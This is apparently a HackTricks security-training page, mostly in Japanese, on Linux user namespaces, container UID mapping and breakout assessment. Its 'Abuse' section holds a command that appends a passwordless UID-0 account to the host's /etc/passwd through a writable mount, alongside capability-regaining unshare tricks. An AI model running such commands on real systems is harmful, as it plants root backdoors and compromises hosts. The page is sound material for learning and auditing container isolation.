# User Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Overview

user namespace は、namespace 内部で認識される user ID と group ID を、namespace 外部の異なる ID に kernel が map できるようにすることで、user ID と group ID の意味を変更します。これは、classic containers における歴史的な最大の問題に直接対処するため、現代の container protection の中でも特に重要なものの 1 つです。つまり、**container 内部の root が、host 上の root に近すぎる状態だった**という問題です。

user namespace を使用すると、process は container 内部で UID 0 として実行されながら、host 上では unprivileged UID range に対応させることができます。これにより、その process は container 内の多くの作業では root のように振る舞いながら、host の観点からは大幅に低い権限しか持たなくなります。これですべての container security problem が解決するわけではありませんが、container compromise の影響は大きく変わります。

## Operation

user namespace には、`/proc/self/uid_map` や `/proc/self/gid_map` などの mapping file があり、namespace ID が parent ID にどのように変換されるかを記述します。namespace 内部の root が unprivileged host UID に map されている場合、実際の host root を必要とする operation は、同じ重みを持たなくなります。これが、user namespace が **rootless containers** の中心となる理由であり、以前の rootful container default と、より現代的な least-privilege design の最大の違いの 1 つとなる理由です。

この点は subtle ですが非常に重要です。container 内部の root は排除されるのではなく、**translated** されます。process は依然としてローカルでは root に近い environment を使用しますが、host はそれを full root として扱うべきではありません。

## Lab

手動での test は次のとおりです。
```bash
unshare --user --map-root-user --fork bash
id
cat /proc/self/uid_map
cat /proc/self/gid_map
```
これにより、現在のユーザーは namespace 内では root として表示されますが、namespace の外側にあるホストの root にはなりません。これは、user namespaces が非常に有用である理由を理解するための、最も優れたシンプルなデモの 1 つです。

containers 内では、次のように表示される mapping を比較できます。
```bash
docker run --rm debian:stable-slim sh -c 'id && cat /proc/self/uid_map'
```
正確な出力は、engine が user namespace remapping を使用しているか、より従来型の rootful 構成を使用しているかによって異なります。

host 側から mapping を読み取ることもできます：
```bash
cat /proc/<pid>/uid_map
cat /proc/<pid>/gid_map
```
## Runtime Usage

Rootless Podman は、user namespaces が第一級の security mechanism として扱われている最も明確な例の一つです。Rootless Docker も user namespaces に依存しています。Docker の userns-remap support は rootful daemon deployment の安全性も向上させますが、歴史的には compatibility 上の理由から、多くの deployment で無効化されたままでした。Kubernetes の user namespaces support は改善されていますが、adoption と defaults は runtime、distro、cluster policy によって異なります。Incus/LXC systems も、UID/GID shifting と idmapping の考え方に大きく依存しています。

一般的な傾向は明らかです。user namespaces を真剣に利用する environment は、利用しない environment よりも、「container root とは実際には何を意味するのか」という問いに対して、通常はより適切な答えを提供します。

## Advanced Mapping Details

unprivileged process が `uid_map` または `gid_map` に書き込む場合、kernel は privileged parent namespace writer の場合よりも厳格な rules を適用します。許可される mapping は限定されており、`gid_map` については、通常 writer は最初に `setgroups(2)` を無効化する必要があります。
```bash
cat /proc/self/setgroups
echo deny > /proc/self/setgroups
```
この詳細が重要なのは、rootless の実験で user-namespace のセットアップがときどき失敗する理由と、runtime が UID/GID delegation 周辺で慎重な helper logic を必要とする理由を説明しているためです。

もう1つの高度な機能が **ID-mapped mount** です。ディスク上の ownership を変更する代わりに、ID-mapped mount は user-namespace の mapping を mount に適用し、その mount view を通して ownership が変換されて見えるようにします。これは rootless および最新の runtime setup で特に重要です。再帰的な `chown` 操作を行わずに、共有された host path を使用できるためです。Security の観点では、この機能によって bind mount が namespace 内部からどの程度 writable に見えるかが変わりますが、基盤となる filesystem metadata 自体を書き換えるわけではありません。

最後に、process が新しい user namespace を作成またはその内部に入ると、**その namespace 内で**完全な capability set を受け取ることを覚えておいてください。これは、突然 host-global な権限を得たという意味ではありません。これらの capabilities は、namespace model およびその他の protections が許可する範囲でのみ使用できます。これが、`unshare -U` によって mount や namespace-local な privileged operations が突然可能になる一方で、host root boundary が直接消滅するわけではない理由です。

## Misconfigurations

最大の weakness は、user namespaces を利用可能な環境で、単純に使用していないことです。container root が host root に直接近い形で mapping されている場合、writable な host mount や privileged kernel operations ははるかに危険になります。もう1つの問題は、trust boundary がどれほど変化するかを認識しないまま、compatibility のために host user namespace sharing を強制したり、remapping を無効化したりすることです。

user namespaces は、model の他の部分と合わせて考慮する必要もあります。有効になっている場合でも、広範な runtime API exposure や非常に弱い runtime configuration によって、別の path を通じた privilege escalation が可能になることがあります。しかし、user namespaces がなければ、多くの古い breakout class ははるかに容易に exploit できます。

## Abuse

container が user namespace separation のない rootful である場合、writable な host bind mount ははるかに危険になります。process が実際に host root として書き込みを行う可能性があるためです。危険な capabilities も同様に、より大きな意味を持つようになります。translation boundary がほとんど存在しないため、attacker はその境界に対してそれほど強く対処する必要がなくなります。

container breakout path を評価する際は、user namespace の有無を早い段階で確認すべきです。これですべての疑問に答えられるわけではありませんが、「container 内の root」が host に直接関係するかどうかを直ちに示すことができます。

最も実用的な abuse pattern は、mapping を確認した後、host-mounted content が host に関連する privileges で writable かどうかを直ちに test することです：
```bash
id
cat /proc/self/uid_map
cat /proc/self/gid_map
touch /host/tmp/userns_test 2>/dev/null && echo "host write works"
ls -ln /host/tmp/userns_test 2>/dev/null
```
ファイルが実ホストの root として作成される場合、そのパスでは user namespace isolation が実質的に存在しません。その時点で、従来の host-file abuse が現実的になります:
```bash
echo 'x:x:0:0:x:/root:/bin/bash' >> /host/etc/passwd 2>/dev/null || echo "passwd write blocked"
cat /host/etc/passwd | tail
```
ライブアセスメントでより安全に確認するには、重要なファイルを変更する代わりに、無害なマーカーを書き込みます。
```bash
echo test > /host/root/userns_marker 2>/dev/null
ls -l /host/root/userns_marker 2>/dev/null
```
これらのチェックが重要なのは、次の本質的な問いにすぐ答えられるからです。つまり、この container 内の root が host の root に十分近くマッピングされており、書き込み可能な host mount が直ちに host compromise への経路になるかどうかです。

### 完全な例: Namespace-Local Capabilities の再取得

seccomp が `unshare` を許可し、環境が新しい user namespace の作成を許可している場合、プロセスはその新しい namespace 内で完全な capability set を再取得できる可能性があります。
```bash
unshare -UrmCpf bash
grep CapEff /proc/self/status
mount -t tmpfs tmpfs /mnt 2>/dev/null && echo "namespace-local mount works"
```
これは、それ自体では host escape ではありません。重要なのは、user namespaces によって namespace 内でのみ有効な特権アクションが再び可能になり、それが後から弱い mount、脆弱な kernel、または外部に不適切に公開された runtime surface と組み合わさる可能性がある点です。

## Checks

これらのコマンドは、このページで最も重要な質問、つまりこの container 内部の root が host 上で何にマッピングされているか、に答えるためのものです。
```bash
readlink /proc/self/ns/user   # User namespace identifier
id                            # Current UID/GID as seen inside the container
cat /proc/self/uid_map        # UID translation to parent namespace
cat /proc/self/gid_map        # GID translation to parent namespace
cat /proc/self/setgroups 2>/dev/null   # GID-mapping restrictions for unprivileged writers
```
ここで重要なのは次の点です。

- プロセスが UID 0 で、`maps` にホストの root への直接的または非常に近いマッピングが示されている場合、そのコンテナははるかに危険です。
- root が非特権のホスト範囲にマッピングされている場合、これはより安全なベースラインであり、通常は実際の user namespace isolation を示します。
- マッピングファイルは `id` 単体よりも価値があります。`id` は namespace 内部の identity しか表示しないためです。

workload が UID 0 として実行され、マッピングがこれにホストの root が近く対応していることを示している場合、コンテナの残りの privileges はより厳格に解釈する必要があります。

{{#include ../../../../../banners/hacktricks-training.md}}
